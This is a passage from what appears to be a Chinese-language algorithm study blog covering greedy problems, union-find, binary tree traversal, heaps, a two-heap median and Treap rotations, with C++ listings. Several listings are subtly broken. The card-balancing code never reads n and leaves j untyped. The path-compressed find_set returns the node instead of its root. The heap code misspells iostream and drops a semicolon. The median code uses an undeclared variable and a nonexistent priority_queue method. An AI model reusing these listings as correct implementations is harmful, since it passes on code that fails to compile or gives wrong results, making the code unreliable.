<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">cow</span>&#123;</span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">    <span class="type">int</span> end;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> ans[<span class="number">50001</span>];</span><br><span class="line">cow cows[<span class="number">50001</span>];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(cow a,cow b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.start&lt;b.start;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;cows[i].start&gt;&gt;cows[i].end;</span><br><span class="line">        cows[i].id = i;</span><br><span class="line">    &#125;</span><br><span class="line">    priority_queue&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;,vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; &gt;,greater&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt; &gt; que;</span><br><span class="line">    <span class="built_in">sort</span>(cows,cows+n,cmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(que.<span class="built_in">empty</span>()||que.<span class="built_in">top</span>().first&gt;=cows[i].start)&#123;</span><br><span class="line">            pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; stall;</span><br><span class="line">            stall.first = cows[i].end;</span><br><span class="line">            stall.second = (<span class="type">int</span>)que.<span class="built_in">size</span>();</span><br><span class="line">            ans[cows[i].id] = stall.second;</span><br><span class="line">            que.<span class="built_in">push</span>(stall);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; stall = que.<span class="built_in">top</span>();</span><br><span class="line">            que.<span class="built_in">pop</span>();</span><br><span class="line">            stall.first = cows[i].end;</span><br><span class="line">            ans[cows[i].id] = stall.second;</span><br><span class="line">            que.<span class="built_in">push</span>(stall);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;que.<span class="built_in">size</span>()&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cout&lt;&lt;ans[i]+<span class="number">1</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="纸牌均分问题"><a href="#纸牌均分问题" class="headerlink" title="纸牌均分问题"></a>纸牌均分问题</h2><p>直接来看题:</p>
<p><img src="/2023/12/05/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/image-4.png"></p>
<p>这道题用贪心策略解决, 具体的策略为每次移动都让被移动方达到最终的状态.</p>
<p>在这里, 最终状态是已知的(求和后除以 $N$ 就好), 我们要达到贪心策略, 那就是根据最终状态来算出当前纸牌需要移动或者获得多少张牌才达到最终状态, 例如 9 8 17 6 中, 最终状态为 10, 我们先将每一个数减去 10, 得到 -1 -2 7 -4.然后从左往右开始, 第一个牌堆是-1, 那就把 -1 加到第二个牌堆去, 此时为 0 -3 7 -4, 在到第二个牌堆, 将 -3 移过去, 就变成 0 0 4 -4, 以此类推最后到达状态 0 0 0 0, 并记录移动次数即可.</p>
<p>具体代码有很多细节,减去均值后, 要找到左起第一个非 0 的和右起第一个非 0 的才可以继续, 并且在移牌的时候可能会产生 0 , 或者中间就有为 0 的牌堆, 要记得剔除掉这些情况.<br>代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> avg=<span class="number">0</span>, res=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> num[<span class="number">110</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;num[i];</span><br><span class="line">        avg+=num[i];</span><br><span class="line">    &#125;</span><br><span class="line">    avg = avg/n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n;i++)&#123;</span><br><span class="line">        num[i] -= avg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>; j=n<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 找到左边起第一个非 0</span></span><br><span class="line">    <span class="keyword">while</span>(num[i]==<span class="number">0</span> &amp;&amp; i&lt;n)&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 找到右边起第一个非 0</span></span><br><span class="line">    <span class="keyword">while</span>(num[j]==<span class="number">0</span> &amp;&amp; j&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        j--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        num[i+<span class="number">1</span>] += num[i];</span><br><span class="line">        num[i] = <span class="number">0</span>;</span><br><span class="line">        res++;</span><br><span class="line">        i++;</span><br><span class="line">        <span class="comment">// 如果移牌后产生了 0</span></span><br><span class="line">        <span class="keyword">while</span>(num[i]==<span class="number">0</span> &amp;&amp; i&lt;j)&#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>贪心</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】高级数据结构</title>
    <url>/2023/12/26/%E7%AE%97%E6%B3%95-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="【算法】高级数据结构"><a href="#【算法】高级数据结构" class="headerlink" title="【算法】高级数据结构"></a>【算法】高级数据结构</h1><h2 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h2><p>并查集简要来说就是一个聚类操作，然后选区类里面的一个元素作为代表，用于将一类的元素划分到一个集合当中。</p>
<p>例题</p>
<p><img src="/2023/12/26/%E7%AE%97%E6%B3%95-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image.png"></p>
<p>并查集标程，并查集的构造需要三个核心功能：</p>
<ul>
<li>初始化并查集</li>
<li>合并元素集合</li>
<li>查找集合代表元素</li>
</ul>
<p>如何查有多少个集合：直接 <code>for</code> 循环遍历，查找有多少个 <code>s[i]=i</code> ，就有多少个集合</p>
<p>问2，查找，合并的复杂度是多少：<br>合并操作的复杂度其实就是查找的复杂度，查找最坏情况下要遍历所有的节点，所以是$O(n)$</p>
<h3 id="标程代码"><a href="#标程代码" class="headerlink" title="标程代码"></a>标程代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> s[<span class="number">5001</span>];</span><br><span class="line"><span class="type">int</span> n,m,p;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        s[i]=i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find_set</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x==s[x]?x:<span class="built_in">find_set</span>(s[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">union_set</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> xroot = <span class="built_in">find_set</span>(x);</span><br><span class="line">    <span class="type">int</span> yroot = <span class="built_in">find_set</span>(y);</span><br><span class="line">    <span class="keyword">if</span>(xroot!=yroot)&#123;</span><br><span class="line">        s[xroot] = s[yroot];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;p;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="type">int</span> a,b;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        <span class="built_in">union_set</span>(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(p--)&#123;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">find_set</span>(a)==<span class="built_in">find_set</span>(b))&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;Yes&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;No&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上代码中的并查集操作实际上是比较低效的，可以通过优化来达到更高效的操作，以下是一些优化步骤：</p>
<h3 id="优化合并操作"><a href="#优化合并操作" class="headerlink" title="优化合并操作"></a>优化合并操作</h3><p>由于在上面的代码中，我们都把集合赋值给<code>y</code> 那一方，导致出现这样一种状况，可能把高度较大的树并到了高度较小的树当中，导致原本高的那颗树又加 1 层，变得更高，查找时就更慢。我们可以优化这种操作，让他把<strong>高度较小的树并到高度较大的树中</strong></p>
<p><img src="/2023/12/26/%E7%AE%97%E6%B3%95-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-1.png"></p>
<p>具体代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> height[<span class="number">5001</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        s[i]=i;</span><br><span class="line">        height[i]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">union_set</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> xroot = <span class="built_in">find_set</span>(x);</span><br><span class="line">    <span class="type">int</span> yroot = <span class="built_in">find_set</span>(y);</span><br><span class="line">    <span class="comment">// 对于树高一样的，合并后会增加一层树的高度</span></span><br><span class="line">    <span class="keyword">if</span>(height[xroot] == height[yroot])&#123;</span><br><span class="line">        height[xroot] = height[xroot] + <span class="number">1</span>;</span><br><span class="line">        s[yroot] = xroot;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对于树高不一样的，把小树并到大树中，高度还是大树的高度保持不变</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(height[xroot] &lt; height[yroot])</span><br><span class="line">            s[xroot] = s[yroot];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s[yroot] = s[xroot];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="优化查询操作"><a href="#优化查询操作" class="headerlink" title="优化查询操作"></a>优化查询操作</h3><p>在查询过程中，我们是沿着节点一个个递归往回查找的，如果在递归回去的过程中，我们可以把递归最后一层的结果往回传递，来更新查询路径，如下</p>
<p><img src="/2023/12/26/%E7%AE%97%E6%B3%95-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-2.png"></p>
<p>具体实现代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">find_set</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s[x]!=x)&#123;</span><br><span class="line">        s[x] = <span class="built_in">find_set</span>(s[x]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>二叉树就是每层每个节点最多有两个子节点：左孩子和右孩子。如果每一层的节点数都是满的，称为<strong>满二叉树</strong>。如果保持严格从左到右的顺序添加节点，且只在最后一层有缺失，称为<strong>完全二叉树</strong></p>
<p><img src="/2023/12/26/%E7%AE%97%E6%B3%95-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-3.png"></p>
<h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><p>二叉树有三种常见的遍历方式</p>
<ul>
<li>先序遍历：按照父结点-&gt;左孩子-&gt;右孩子的顺序遍历</li>
<li>中序遍历：按照左孩子-&gt;父结点-&gt;右孩子的顺序遍历</li>
<li>后序遍历：按照左孩子-&gt;右孩子-&gt;父结点的顺序遍历</li>
</ul>
<p>代码就不列出了，就是简单的递归，取决于把 <code>cout</code> 放在哪里罢了。</p>
<p>这里如果只知道先序遍历与后序遍历，是不能确定一棵树的，下面这种分支，先序和后序的结果都一样</p>
<p><img src="/image-4.png"></p>
<p>已知先序和中序如何还原树：</p>
<p><img src="/2023/12/26/%E7%AE%97%E6%B3%95-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-5.png"></p>
<p>已知中序和后序的还原过程也和上面类似。</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><img src="/2023/12/26/%E7%AE%97%E6%B3%95-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-6.png"></p>
<p>标程</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">treenode</span>&#123;</span><br><span class="line">    <span class="type">int</span> l,r;</span><br><span class="line">&#125;node[<span class="number">1000010</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">preorder</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;t;</span><br><span class="line">    <span class="keyword">if</span>(node[t].l) <span class="built_in">preorder</span>(node[t].l);</span><br><span class="line">    <span class="keyword">if</span>(node[t].r) <span class="built_in">preorder</span>(node[t].r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">inorder</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(node[t].l) <span class="built_in">inorder</span>(node[t].l);</span><br><span class="line">    cout&lt;&lt;t;</span><br><span class="line">    <span class="keyword">if</span>(node[t].r) <span class="built_in">inorder</span>(node[t].r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">postorder</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(node[t].l) <span class="built_in">postorder</span>(node[t].l);</span><br><span class="line">    <span class="keyword">if</span>(node[t].r) <span class="built_in">postorder</span>(node[t].r);</span><br><span class="line">    cout&lt;&lt;t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="type">int</span> a,b;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        <span class="keyword">if</span>(a) node[i].l = a;</span><br><span class="line">        <span class="keyword">if</span>(b) node[i].r = b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">preorder</span>(<span class="number">1</span>);</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">inorder</span>(<span class="number">1</span>);</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">postorder</span>(<span class="number">1</span>);</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一些小细节，这里使用了内联函数 <code>inline</code>，内联函数请求编译器在每个调用点直接替换该函数的代码，而不是正常的调用函数的过程，他会嵌入主函数当中，可以减少频繁调用函数所产生的开销，这里是有一些使用条件的，由于这几个遍历方式所带来的<strong>代码体量小</strong>，不会显著增大主函数的代码量，并且<strong>递归是频繁调用</strong>的，所以使用内联函数可以节约很多调用所带来的开销。</p>
<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><h3 id="堆的概念"><a href="#堆的概念" class="headerlink" title="堆的概念"></a>堆的概念</h3><p>堆是一个树形结构，是一颗完全二叉树，严格满足<strong>根节点是整颗树的最大或者最小值</strong>，同时各个父结点的值比孩子节点的值<strong>大或者小</strong>（取决于是大根堆还是小根堆）。</p>
<h3 id="插入元素"><a href="#插入元素" class="headerlink" title="插入元素"></a>插入元素</h3><p>堆的插入操作，就是把要插入的元素先放到数组末尾，然后在按照堆的规则往上跳</p>
<p><img src="/2023/12/26/%E7%AE%97%E6%B3%95-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-7.png"></p>
<p>复杂度是 $O(logn)$ 因为是按照树的层级往上跳的</p>
<h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><p>元素的删除，就把叶子节点的元素覆盖到那个节点，如果是根节点，把覆盖后的节点下沉，如果是非根节点，还要考虑会上移（比如小根堆中，这个叶子节点可能比覆盖的节点还小）。</p>
<p><img src="/image-8.png"></p>
<h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><p><img src="/2023/12/26/%E7%AE%97%E6%B3%95-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-9.png"></p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iosream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> heap[MAXN+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//下沉操作</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">(<span class="type">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">2</span>*k&lt;=len)&#123;</span><br><span class="line">        <span class="type">int</span> node = <span class="number">2</span>*k; <span class="comment">//左孩子</span></span><br><span class="line">        <span class="comment">//选择小的那个孩子</span></span><br><span class="line">        <span class="keyword">if</span>(node+<span class="number">1</span>&lt;=len&amp;&amp;heap[node]&gt;heap[node+<span class="number">1</span>])&#123;</span><br><span class="line">            node += <span class="number">1</span>; <span class="comment">//右孩子</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(heap[k] &lt;= heap[node]) <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">swap</span>(heap[k],heap[node]);</span><br><span class="line">        k = node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//上浮操作</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">up</span><span class="params">(<span class="type">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(k&gt;<span class="number">1</span>&amp;&amp;heap[k/<span class="number">2</span>]&gt;heap[k])&#123;</span><br><span class="line">        <span class="built_in">swap</span>(heap[k],heap[k/<span class="number">2</span>]);</span><br><span class="line">        k/=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    heap[++len] = x;</span><br><span class="line">    <span class="built_in">up</span>(len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//堆弹出</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">swap</span>(heap[<span class="number">1</span>],heap[len]);</span><br><span class="line">    len--;</span><br><span class="line">    <span class="built_in">down</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        cin&gt;&gt;x;</span><br><span class="line">        <span class="built_in">insert</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cout&lt;&lt;heap[<span class="number">1</span>]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再来看一道例题</p>
<p><img src="/2023/12/26/%E7%AE%97%E6%B3%95-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-10.png"></p>
<p>求中位数，最简单的方法就是用插入排序，每次插入排序后长度为奇数时，输出他的中间数即可。</p>
<p>如果用堆去做，可以将堆分为一个大根堆和一个小根堆，满足小根堆的根节点大于大根堆的根节点，这样就可以把数组等分成两个部分，然后用大根堆的根去存储中位数即可。</p>
<p>这里需要注意的是，堆也是需要动态调整的，如果一直出现很小的数，就会一直往大根堆里放，导致不等分，所以有两种情况：</p>
<ol>
<li>小根堆不能比大根堆多，因为中位数是大根堆的根节点</li>
<li>大根堆不能比小根堆多 3 个元素以上（包括 3 个元素）这样的话就不平衡了</li>
</ol>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">priority_queue&lt;<span class="type">int</span>&gt; que1; <span class="comment">//大根堆</span></span><br><span class="line">priority_queue&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt;,greater&lt;<span class="type">int</span>&gt;&gt; que2; <span class="comment">//小根堆</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=(n<span class="number">-1</span>)/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="type">int</span> mid = que2.<span class="built_in">top</span>();</span><br><span class="line">        <span class="keyword">if</span>(x&gt;=mid)&#123;</span><br><span class="line">            que2.<span class="built_in">push</span>(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            que1.<span class="built_in">push</span>(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(y&gt;=mid)&#123;</span><br><span class="line">            que2.<span class="built_in">push</span>(y);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            que1.<span class="built_in">push</span>(y);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(que2.<span class="built_in">size</span>()&gt;que1.<span class="built_in">size</span>())&#123;</span><br><span class="line">            que1.<span class="built_in">push</span>(que2.<span class="built_in">top</span>());</span><br><span class="line">            que2.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(que1.<span class="built_in">size</span>()-que2.<span class="built_in">size</span>()==<span class="number">3</span>)&#123;</span><br><span class="line">            que2.<span class="built_in">push</span>(que1.<span class="built_in">front</span>());</span><br><span class="line">            que1.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;que1.<span class="built_in">top</span>()&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二叉搜索树与平衡树"><a href="#二叉搜索树与平衡树" class="headerlink" title="二叉搜索树与平衡树"></a>二叉搜索树与平衡树</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>二叉搜索树（BST），是指对每一个节点的键值，都大于它左孩子节点的键值，小于它右孩子节点的键值。</p>
<p>BST不是完全二叉树，因为在插入时并不是严格从左到右插入的，会插到符合条件的地方。</p>
<p>使用<strong>中序遍历</strong>就能得到二叉搜索树的有序排序</p>
<p><img src="/2023/12/26/%E7%AE%97%E6%B3%95-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-11.png"></p>
<h3 id="插入与平衡树"><a href="#插入与平衡树" class="headerlink" title="插入与平衡树"></a>插入与平衡树</h3><p>因为比较复杂，所以仅作概念介绍</p>
<h4 id="Treap树"><a href="#Treap树" class="headerlink" title="Treap树"></a>Treap树</h4><p>Treap 树是一种平衡树，名字的由来是 Tree+Heap，Treap 树中的每个节点有两个值，键值和优先级。Treap 树的优先级是<strong>随机分配</strong>的（比起带权分配，完全随机更加能保证树的平衡性，对所有节点都是公平的）</p>
<p><img src="/2023/12/26/%E7%AE%97%E6%B3%95-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-13.png"></p>
<h4 id="树的左旋与右旋"><a href="#树的左旋与右旋" class="headerlink" title="树的左旋与右旋"></a>树的左旋与右旋</h4><p>BST 的插入如果按照简单的插入方法，就会导致 BST 的分支往一边堆积，导致不平衡，查找复杂度由 $O(logn)$ 变为 $O(n)$ ，这里只探讨 Treap 树的平衡方法-旋转：</p>
<p>我对一个点的旋转操作是这样理解的，以右旋为例，想象它从这个点被拎起来，被拎起来后原来的父节点就要挤到它的右节点去，原来的右节点被挤下来，然后继续拼到 Q 的左节点去。左旋同理</p>
